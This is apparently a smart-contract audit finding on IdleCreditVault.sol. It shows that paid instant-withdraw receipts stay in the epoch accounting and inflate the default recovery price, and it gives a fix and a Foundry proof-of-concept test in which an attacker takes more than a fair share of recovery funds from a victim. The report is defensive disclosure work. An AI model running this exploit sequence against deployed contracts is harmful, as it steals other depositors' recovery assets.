### Title
Claimed instant-withdraw receipts remain in epoch recovery accounting and inflate default claims - ([File: contracts/strategies/idle/IdleCreditVault.sol](contracts/strategies/idle/IdleCreditVault.sol))

### Summary
`claimInstantWithdrawRequest` clears only `instantWithdrawsRequests[_user]` when paying a funded instant withdrawal. It does not clear `instantWithdrawsRequestsByEpoch[_user][epoch]` or decrease `instantWithdrawClaimsByEpoch[epoch]`. If another instant request later remains pending in the same epoch and the borrower defaults, the already-paid receipt is counted again as both default claim basis and prefunded recovery reserve, corrupting `defaultRecoveryPrice` and allowing an earlier default claimant to take recovery funds belonging to later claimants.

### Finding Description
`requestInstantWithdraw` records the same request in the user ledger, user-epoch ledger, epoch aggregate, and global pending balance. `collectInstantWithdrawFunds` correctly decreases only the unfunded `pendingInstantWithdraws` balance when funds arrive. However, a normal funded claim clears only `instantWithdrawsRequests[_user]`; both epoch-level receipts remain unchanged.

When `pendingInstantWithdraws != 0`, `defaultPendingClaimBasis` adds the full `instantWithdrawClaimsByEpoch[epochNumber]`. `_defaultPrefundedInstantReserve` then treats `instantWithdrawClaimsByEpoch[epochNumber] - pendingInstantWithdraws` as cash still held by the strategy. Consequently, an instant receipt that was already paid is counted as outstanding claim basis and also counted as available recovery backing.

The broken invariant is one receipt, one payout: a claimed instant receipt remains part of default recovery accounting.

### Impact Explanation
An attacker can inflate the finalized recovery price and drain more than their fair share of actual recovery assets.

Example:

1. A paid instant claim of `100` leaves `instantWithdrawClaimsByEpoch[epoch] = 100`.
2. The attacker and a victim create new unfunded instant requests of `100` each, so `pendingInstantWithdraws = 200` and `instantWithdrawClaimsByEpoch[epoch] = 300`.
3. Only `100` underlying is recovered externally.
4. Correct recovery price is `100 / 200 = 50%`.
5. The computed basis is `300`, the computed prefunded reserve is `300 - 200 = 100`, and the reported recovery reserve becomes `200`, producing a `2/3` price.
6. The attacker claims `66.66` instead of `50`, receiving `16.66` excess. The victim then cannot receive their recorded claim because the phantom `100` reserve was already paid out before default.

This causes direct theft of recovery assets and can leave later claimants permanently unable to collect their accounted recovery.

### Likelihood Explanation
The sequence requires instant withdrawals to be enabled, one instant receipt to be funded and claimed, a later instant request in the same epoch to remain unfunded, and borrower default recovery to be finalized before that pending request is funded. These actions use normal user and manager flows; the attacker does not need a privileged role, although the exploit benefits from controlling or coordinating two withdrawal wallets because the previously claimed user’s own stale epoch receipt can underflow that same user’s later default claim.

Existing checks do not prevent this: `claimInstantWithdrawRequest` is intended to clear funded claims, while `defaultPendingClaimBasis` and `_defaultPrefundedInstantReserve` intentionally trust the epoch aggregates that were not decremented.

### Recommendation
In `claimInstantWithdrawRequest`, clear the caller’s current-epoch receipt in the same way as `_claimDefaultedInstantWithdrawRequest`:

```solidity
uint256 requestEpoch = epochNumber;
uint256 amount = instantWithdrawsRequests[_user];

if (instantWithdrawsRequestsByEpoch[_user][requestEpoch] >= amount) {
  instantWithdrawsRequestsByEpoch[_user][requestEpoch] -= amount;
} else {
  instantWithdrawsRequestsByEpoch[_user][requestEpoch] = 0;
}
instantWithdrawClaimsByEpoch[requestEpoch] -= amount;
instantWithdrawsRequests[_user] = 0;
```

Alternatively, track separately the unfunded instant basis used by default accounting so already-funded and already-claimed receipts cannot enter `defaultPendingClaimBasis` or `_defaultPrefundedInstantReserve`.

### Proof of Concept
A Foundry fork test can reproduce the accounting error by asserting that a paid receipt remains in the epoch aggregate and then changes the finalized recovery price:

```solidity
function testClaimedInstantReceiptInflatesDefaultRecovery() public {
  _useStandardEpochVariant();
  _stopCurrentEpochWithApr(10e18);

  vm.prank(manager);
  cdoEpoch.setInstantWithdrawParams(100, 1e18, false);

  address paidUser = makeAddr("paidUser");
  address attacker = makeAddr("attacker");
  address victim = makeAddr("victim");

  _depositWithUser(paidUser, 100e6);
  _depositWithUser(attacker, 100e6);
  _depositWithUser(victim, 100e6);

  vm.prank(manager);
  cdoEpoch.startEpoch();

  uint256 epoch = strategy.epochNumber();

  // paidUser creates a funded instant request.
  vm.prank(paidUser);
  cdoEpoch.requestInstantWithdraw(100e18, address(tranche));

  vm.warp(block.timestamp + 101);
  vm.prank(manager);
  cdoEpoch.getInstantWithdrawFunds();

  vm.prank(paidUser);
  cdoEpoch.claimInstantWithdrawRequest();

  // User ledger is cleared, but both epoch ledgers still contain the paid receipt.
  assertEq(strategy.instantWithdrawsRequests(paidUser), 0);
  assertEq(strategy.instantWithdrawsRequestsByEpoch(paidUser, epoch), 100e18);
  assertEq(strategy.instantWithdrawClaimsByEpoch(epoch), 100e18);

  // New same-epoch requests remain unfunded.
  vm.prank(attacker);
  cdoEpoch.requestInstantWithdraw(100e18, address(tranche));
  vm.prank(victim);
  cdoEpoch.requestInstantWithdraw(100e18, address(tranche));

  assertEq(strategy.pendingInstantWithdraws(), 200e18);
  assertEq(strategy.instantWithdrawClaimsByEpoch(epoch), 300e18);

  // Borrower defaults before funding the 200 pending instant requests.
  // Finalize recovery with only 100 external underlyings recovered.
  _defaultAndFinalizeRecovery(100e6);

  // Incorrect accounting reports:
  // basis = 300, prefunded reserve = 100, total reserve = 200, price = 2/3.
  assertEq(strategy.instantWithdrawClaimsByEpoch(epoch), 300e18);
  assertEq(strategy.defaultRecoveryPrice(), 666666666666666666);

  uint256 attackerBalBefore = underlying.balanceOf(attacker);
  vm.prank(attacker);
  cdoEpoch.claimInstantWithdrawRequest();

  // Correct fair price over the two unfunded claims is 50%; attacker receives 66.66 instead.
  assertGt(underlying.balanceOf(attacker) - attackerBalBefore, 50e6);

  // Victim's recorded claim remains, but actual cash backing was consumed by the inflated payout.
  vm.expectRevert();
  vm.prank(victim);
  cdoEpoch.claimInstantWithdrawRequest();
}
```

The decisive state assertion is before finalization: `instantWithdrawsRequests[paidUser]` is zero while `instantWithdrawsRequestsByEpoch[paidUser][epoch]` and `instantWithdrawClaimsByEpoch[epoch]` still include `100e18`. That stale basis is then reused by `defaultPendingClaimBasis` and `_defaultPrefundedInstantReserve`.
